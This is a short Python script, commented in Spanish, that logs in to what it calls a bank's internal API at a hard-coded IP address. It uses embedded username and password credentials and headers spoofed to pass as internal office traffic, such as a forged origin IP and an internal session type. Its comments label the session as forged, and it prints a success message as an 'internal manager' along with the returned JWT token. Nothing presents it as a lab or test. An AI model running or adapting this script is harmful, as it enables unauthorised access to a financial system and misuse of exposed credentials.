import requests

# === HOST ===
base_url = "http://80.78.30.242:9181"
login_url = f"{base_url}/api/login/"

# === Credenciales ===
user = "markmur88"
passwd = "Ptf8454Jd55"

# === Cabeceras internas del banco ===
headers = {
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "application/json",
    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-CENTRAL-ES",
    "X-Requested-With": "XMLHttpRequest",
    "X-Session-Type": "BANCO-INTERNAL"
}

# === Sesión falsificada ===
session = requests.Session()
session.headers.update(headers)

# === Paso 1: Login al sistema interno del banco ===
login_body = {
    "username": user,
    "password": passwd
}

response = session.post(login_url, json=login_body)
if response.status_code == 200:
    token = response.json().get("access_token")
    print("[+] ¡Login exitoso como gerente interno!")
    print("Token JWT:", token)
else:
    print("[-] Error al loguearse.")
    print("Status Code:", response.status_code)
    print("Respuesta del sistema:", response.text)